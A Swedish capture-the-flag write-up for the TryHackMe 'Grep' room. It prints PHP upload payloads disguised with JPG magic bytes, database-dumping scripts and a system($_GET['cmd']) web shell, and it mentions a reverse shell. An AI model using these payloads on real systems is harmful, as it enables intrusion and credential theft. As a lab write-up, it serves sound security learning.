# Grep

https://tryhackme.com/room/greprtp

![Screenshot](img/Pasted%20image%2020260328134808.png)

![Screenshot](img/Pasted%20image%2020260328134826.png)
## Initial Recon

![Screenshot](img/Pasted%20image%2020260329113354.png)
### Nmap
Körde `nmap -sS -sV -v $IP` och fick följande output:

![Screenshot](img/Pasted%20image%2020260328135704.png)

Port 22, 80 och 443 öppna.

Port 80 har endast Apache2 Default Page

![Screenshot](img/Pasted%20image%2020260328135817.png)

Port 443 (https) gav en 403 Forbidden

![Screenshot](img/Pasted%20image%2020260328135935.png)

### Feroxbuster
Körde `feroxbuster -w wordlists/common.txt -u http://$IP` och fick följande:

![Screenshot](img/Pasted%20image%2020260328140216.png)

Träffarna leder ingen vart tyvärr.

### Ferox igen
Körde samma kommando fast mot `https`, fick lite intressanta cgi-träffar

![Screenshot](img/Pasted%20image%2020260328141903.png)

Men det blir även 403 Forbidden om jag försöker besöka dem.
## OSINT
Googlar på namnet SuperSecure Corp, eftersom företaget kallas för det i uppgiften, och ser vad vi får för träffar - kollar Github först.

Hittade ingen träff på det exakta namnet, men hittade följande:

![Screenshot](img/Pasted%20image%2020260328142300.png)

Kan detta höra till CTF:en? Nope.
### En missad detalj
Tobzon hann före mig och Onind00 och hade lyckats komma åt sajten. Onind hade kört Nikto, men missat en detalj - en avslöjande url.

![Screenshot](img/Pasted%20image%2020260328144430.png)

Den URL:en hade inte synts när han körde mot port 80, men den syntes i en körning mot port 443. När jag lade in den i `/etc/hosts` kunde jag besöka https-versionen av hemsidan, super!

![Screenshot](img/Pasted%20image%2020260328144718.png)

### Ny Feroxbuster
Nu mot rätt url och https.

![Screenshot](img/Pasted%20image%2020260328145010.png)

Ändå en hel del intressanta saker.
### Försöker registrera
Försöker regga ett konto, men får:

![Screenshot](img/Pasted%20image%2020260328145551.png)

Invalid or Expired API key. Och det är just en API key vi behöver för att kunna svara på första frågan.
### OSINT igen

Tobzon hade en smart idé - kollade detaljerna för SSL-certet.

![Screenshot](img/Pasted%20image%2020260328145759.png)

Genom att söka på organisationens namn på GitHub, alltså `SearchME`, och sedan sortera på PHP, kom det här repot som första träff.

![Screenshot](img/Pasted%20image%2020260328150006.png)

Hittade en commit med ett talande namn

![Screenshot](img/Pasted%20image%2020260328150548.png)

Och den commiten innehöll API-nyckeln som var svaret på första frågan, great!
## Använda nyckeln

![Screenshot](img/Pasted%20image%2020260329113448.png)

Nu när vi har en giltig API-nyckel var det bara att skicka med den när jag registrerade ett nytt konto. Detta gjorde jag genom att upprepa min registrering som tidigare, men med nätverkstabben öppen i Firefox. 

Requesten som inte gick fram, p.g.a. ogiltig API-nyckel, högerklickade jag på och tog *Edit and resend*. Därefter kunde jag redigera värdet för headern `X-Thm-Api-Key` med API-nyckeln från commiten och klicka på send.

![Screenshot](img/Pasted%20image%2020260328151722.png)

Därefter kunde jag logga in och hitta svaret på nästa fråga!

<details>
  <summary><b>Klicka här för att se flaggan</b></summary>

  ![Screenshot](img/Pasted%20image%2020260328152019.png)
</details>

## Admin email

![Screenshot](img/Pasted%20image%2020260329113515.png)

Näst på tur är att hitta mailadressen till admin.

Baserat på infon vi hittade i repot förstod vi att det fanns en uppladdningsfunktion. Uppladdningsfunktionen verkade endast ta emot bildfiler, men valideringen skedde endast genom att kontrollera filens *magic bytes.* Kan vi skapa en payload med php, med magic bytes för en jpg, och ladda upp? Och tillåter servern att exekvera vår payload?

Onind00 fixade ett script som skrev ut våra php-snippets och samtidigt redigerade magic bytes. För att testa blev det ett script som skulle köra `phpinfo()`, och visst funkade det.

I php-info kunde vi hitta en mailadress till Server Administrator, `webmaster@grep.thm`, men det var inte svaret vi sökte.

Däremot lyckades Onind00 knåpa ihop ett php-script som dumpade databasen:

```php
printf '\xFF\xD8\xFF\xE0' > dump.php
cat >> dump.php <<'PHP'
<?php 
echo "<pre>"; 
require_once "../config.php"; 

$res = $mysqli->query("SELECT username, email, name FROM users"); 

if (!$res) { 
	die("SQL error: " . $mysqli->error); 
} 

while ($row = $res->fetch_assoc()) { 
	echo "username: " . $row['username'] . " | email: " . $row['email'] . " | name: " . $row['name'] . "\n"; 
} 
echo "</pre>"; 
?>
PHP
```

Hela kommandot ovan kördes i terminalen för att skapa en php-fil som inleds med magic bytes för JPG.

Scriptet dumpade följande:

<details>
  <summary><b>Klicka här för att titta</b></summary>

  ![Screenshot](img/Pasted%20image%2020260328164554.png)
</details><br>

Som innehöll svaret på fråga tre. Three down, two to go!

## Namn på webbtjänst

![Screenshot](img/Pasted%20image%2020260329113540.png)

Efter att ha rotat omkring lite på sajten utan att känna att jag kom närmare en lösning började jag titta på sista frågan istället - att ta fram lösenordet till admin.
## Lösenordet till Admin

![Screenshot](img/Pasted%20image%2020260329113554.png)

I och med att jag hade lyckats dumpa användarnamnen så borde det gå att dumpa lösenorden. Ungefär samma script som när vi hittade mailadressen till admin, men nu så används `SELECT *` istället.

```php
<?php
$conn = new mysqli("localhost", "root", "password", "postman"); 

echo "<pre>"; 

$result = $conn->query("SELECT * FROM users"); 

while($row = $result->fetch_assoc()) { 
	print_r($row); 
	echo "\n"; 
} 

echo "</pre>"; 
?>
```

Då dumpades även lösenorden, dock i krypterad form. 

![Screenshot](img/Pasted%20image%2020260328165536.png)

Dags att kicka igång John the Ripper.

Det verkade lönlöst... Även Hashcat tar en himla tid så jag tror inte det är rätt väg att gå.
## Tillbaka till webbtjänsten...

Kollade om det fanns fler databaser, vilket det gjorde. Kanske att det skulle finnas spår till ett namn på webbtjänsten där?

![Screenshot](img/Pasted%20image%2020260328174701.png)

Databasen tryhackme är ju onekligen intressant. Uppdaterade scriptet till

```php
<?php
$conn = new mysqli("localhost", "root", "password", "postman");
echo "<pre>";
$result = $conn->query("
    SELECT TABLE_SCHEMA, TABLE_NAME 
    FROM INFORMATION_SCHEMA.TABLES 
    WHERE TABLE_SCHEMA IN ('phpmyadmin', 'tryhackme')
    ORDER BY TABLE_SCHEMA, TABLE_NAME
");
while($row = $result->fetch_assoc()) {
    print_r($row);
    echo "\n";
}
echo "</pre>";
?>
```

Det scriptet gav mig dock bara massa tabeller tillhörande phpmyadmin, och ingen såg ut att sticka ut ur det som är standard.

Efter att ha blivit trött på att skapa script och ladda upp för varje tabell jag ville titta i tänkte jag att det måste finnas ett enklare sätt att rota runt på servern. Lyckades ta fram ett web shell och ladda upp det till uploads-mappen.

```php
printf '\xFF\xD8\xFF\xE0' > shell.php
cat >> shell.php <<'PHP'
<?php
$webshell = '<?php system($_GET["cmd"]); ?>';
$result = file_put_contents('/var/www/html/api/uploads/shell.php', $webshell);

if($result) {
    echo "Webshell written successfully!";
} else {
    echo "Error writing file!";
}
?>
PHP
```

Nu ska jag se om jag kan hitta lite info...

`https://grep.thm/api/uploads/shell.php?cmd=whoami` returnerar `www-data` åtminstone

Jag backade några steg för att kolla vad som fanns utanför uploads-mappen och hittade det här:

![Screenshot](img/Pasted%20image%2020260328191648.png)

Mappen `leakchecker` låter lovande i och med att jag letar efter namnet på webappen som hanterar just en sådan tjänst.

Inne i mappen hittar jag `check_email.php` och `index.php`.

Försökte köra `cat` på filerna men det syns inget i webbläsaren. Och att navigera med ett webshell är ju väldigt långsamt... Dags att fixa ett reverse shell istället.

Gjorde det enkelt via revshells.com och tog PHP Pentestmonkey som jag använt tidigare, laddade upp scriptet och poff så hade jag mitt shell.

Navigerade till `/var/www/`, och där hittade jag mina instressanta filer igen

![Screenshot](img/Pasted%20image%2020260328193024.png)

Och denna gången med `cat`

![Screenshot](img/Pasted%20image%2020260328193138.png)

Jag börjar bli lite tokig :D

Men i `/etc/hosts` hittade jag rätt namn

<details>
  <summary><b>Klicka här för att ta en titt</b></summary>

  ![Screenshot](img/Pasted%20image%2020260328193706.png)
</details><br>

Äntligen en seger!

## Sista nu då

Jag ska lägga till subdomänen i min egen hosts-fil och se om jag kan komma åt tjänsten.

Det kunde jag inte, blev 403 Forbidden på den ändå...

Testade ett par varianter med curl, men alla får 403 Forbidden.

Jag ska försöka skippa att komma åt webappen helt och hållet. CTF-utmaningen heter trots allt Grep, så jag får försöka se om jag kan hitta nån databas med gamla queries på filsystemet. Kanske att någon har sökt på admins mailadress och fått tillbaka ett svar i klartext som finns sparat nånstans.

Sökte på allt möjligt på servern. Filer som slutar på `.db`, filer innehållande `backup`, `leakchecker` med mera, med mera... Inget användbart resultat tyvärr.

## En fågel viskade...

Jag vet inte var fågeln kom ifrån, men den sa *scanna alla portar...*

Vad tusan... Okej, nmap igen då, med `-p-`. Då hittade jag en magisk port: `51337`.

Kan det vara endpointen till den berömda mailcheckern?

Testade `https://leakchecker.grep.thm:51337` och visst tusan kom jag fram...

![Screenshot](img/Pasted%20image%2020260328202300.png)

In med admins mailadress där och...

<details>
  <summary><b>Klicka här för att se sista flaggan</b></summary>

  ![Screenshot](img/Pasted%20image%2020260328202409.png)
</details><br>

Wow...

## Fågeln

Det var Tobzon som jag hade samarbetat med tidigare under dagen. Han och Onind00 hade fortsatt medan jag hade annat för mig. Under en diskussion hade Onind berättat att han och jag fått träff på 3 portar tidigare, men Tobzon hade fått träff på 4...

Vad har jag lärt mig av detta? Att alltid, *alltid*, **ALLTID**, scanna alla portar med `-p-` vid första scanningen :D Sen kan man gå på djupet, göra mer noggranna scanningar. Men först, bara dra av en scan över hela gänget. Glöm inte det.